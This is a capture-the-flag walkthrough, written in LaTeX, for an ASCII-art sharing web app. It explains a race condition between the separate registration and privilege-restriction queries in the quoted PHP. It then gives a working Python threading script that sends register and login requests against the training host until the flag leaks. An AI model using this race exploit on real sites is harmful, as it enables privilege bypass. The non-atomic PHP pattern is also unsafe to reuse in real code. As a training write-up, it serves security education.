\section{\texttt{aart} challenge walkthrough}

The challenge presents itself as a simple web application that allows users to register, login and share ASCII art. Posts can then be upvoted and downvoted by other users. The sources of the application are given, including the database schema. \\

\subsection{Vulnerability}
 
Registering a new user and logging in results in an error message: ``\texttt{This is a restricted account}''. The error can be investigated by searching the message in the application sources, which unsurprisingly leads to the \texttt{login.php} file. The relevant part of the code is reported here.

% See https://github.com/gpoore/minted/issues/291
\newenvironment{uglyworkaround}{\par\color{white}}{\par}
\begin{uglyworkaround}
\renewcommand{\theFancyVerbLine}{\rmfamily\textcolor{black}{\tiny{\arabic{FancyVerbLine}}}}
\begin{minted}[escapeinside=!!, samepage, firstline=2, lastline=16, firstnumber=22, breaklines]{html+php}
<?php
$uid = $row['id'];
$sql = "SELECT isRestricted from privs where userid='$uid' and isRestricted=TRUE;";
$result = mysqli_query($conn, $sql); !\label{permcheck}!
$row = $result->fetch_assoc();
if($row['isRestricted']){
    ?>
    <h2>This is a restricted account</h2> !\label{errormsg}!

    <?php
}else{
    ?>
    <h2><?php include('../key');?></h2> !\label{flag}!
    <?php

}
?>
\end{minted}
\end{uglyworkaround}

The code checks with the database whether the current user has a \texttt{isRestricted} flag set. If he does, the above error message is shown (line \ref{errormsg}). Otherwise, a file called \texttt{key} is included in the page (line \ref{flag}). It is reasonable to guess that the \texttt{key} file -- which is not included in the provided sources -- contains the flag. \\

By searching again through the application sources, it is possible to find where the \texttt{isRestricted} flag is set in the database. The following code snippet belongs to the \texttt{register.php} file.

\begin{minted}[escapeinside=!!, samepage, startinline, firstnumber=13, breaklines]{php}
$username = mysqli_real_escape_string($conn, $_POST['username']);
$password = mysqli_real_escape_string($conn, $_POST['password']);

$sql = "INSERT into users (username, password) values ('$username', '$password');"; !\label{query1}!

mysqli_query($conn, $sql); !\label{exec1}!
$sql = "INSERT into privs (userid, isRestricted) values ((select users.id from users where username='$username'), TRUE);"; !\label{query2}!
mysqli_query($conn, $sql); !\label{exec2}!
\end{minted}

Here two queries are created and executed. The first one, at line \ref{query1}, performs the user registration by addding the corresponding row into the database. The second one, at line \ref{query2}, inserts a row into the \texttt{privs} table with the \texttt{isRestricted} flag for the newly registered user. \\

Notice that the two queries are executed separately instead of being part of a single SQL transaction. This leads to a race condition: with accurate timing, an attacker could login to the application after the first query is executed but before the second query is. Indeed, during the short period of time that occurs between lines \ref{exec1} and \ref{exec2}, the user is registered but it is not restricted yet. \\

\subsection{Exploit}

The easiest way of exploiting this vulnerability is repeatedly making two almost simultaneous requests -- one for registration and one for login -- until the second requests happens to be processed while the execution of the first one has reached the \textit{sweet spot} described before.

\begin{table}[H]
\centering
\begin{tabular}{|l|l|}
\hline
\thead[c]{\textbf{\texttt{register.php} request}} & \thead[c]{\textbf{\texttt{login.php} request}} \\ \hline
\makecell[tl]{Registration query (line \ref{exec1})} & \\
& \makecell[tl]{Login query (credentials check)} \\
& \makecell[tl]{\textcolor{red}{Permissions check query (line \ref{permcheck})}}  \\
\makecell[tl]{Permissions update query (line \ref{exec2})} &  \\  \hline
\end{tabular}
\caption{Execution order required for exploiting the vulnerability}
\label{tab:exploit}
\end{table}

\noindent
For this purpose, we can use the \texttt{threading} Python module.

\begin{minted}[samepage, python3]{python}
import requests
import threading
import re
from uuid import uuid4


# Send registration request
def register(user, pwd):
    requests.post(
        "http://aart.training.jinblack.it/register.php",
        data={"username": user, "password": pwd}
    )


# Send login request and check the result
def login(user, pwd):
    global flag_found
    r = requests.post(
        "http://aart.training.jinblack.it/login.php",
        data={"username": user, "password": pwd}
    )
    # Search for the flag in the server response
    # using a regular expression. If the flag is found
    # display it and set flag_found to true
    flag = re.findall(r"flag\{.+\}", r.text)
    if len(flag) > 0:
        flag_found = True
        print(flag[0])


flag_found = False
while not flag_found:
    user = uuid4()  # Random unique username
    pwd = uuid4()  # Random unique password
    t1 = threading.Thread(target=register, args=(user,pwd))
    t2 = threading.Thread(target=login, args=(user,pwd))
    t1.start()
    t2.start()
    # Wait for both threads to finish
    t2.join()
    t1.join()
\end{minted}

The script attempts to exploit the vulnerability by starting two threads one immediately after the other. The first one performs the registration, while the second one performs the login and checks if the flag is present. Since there are no guarantees that the second thread will perform the login at the exact correct time, we repeat the process in a \texttt{while} loop until it succeeds. Anyway, empirical tests show that exploiting the vulnerability doesn't usually require more than a couple attempts.
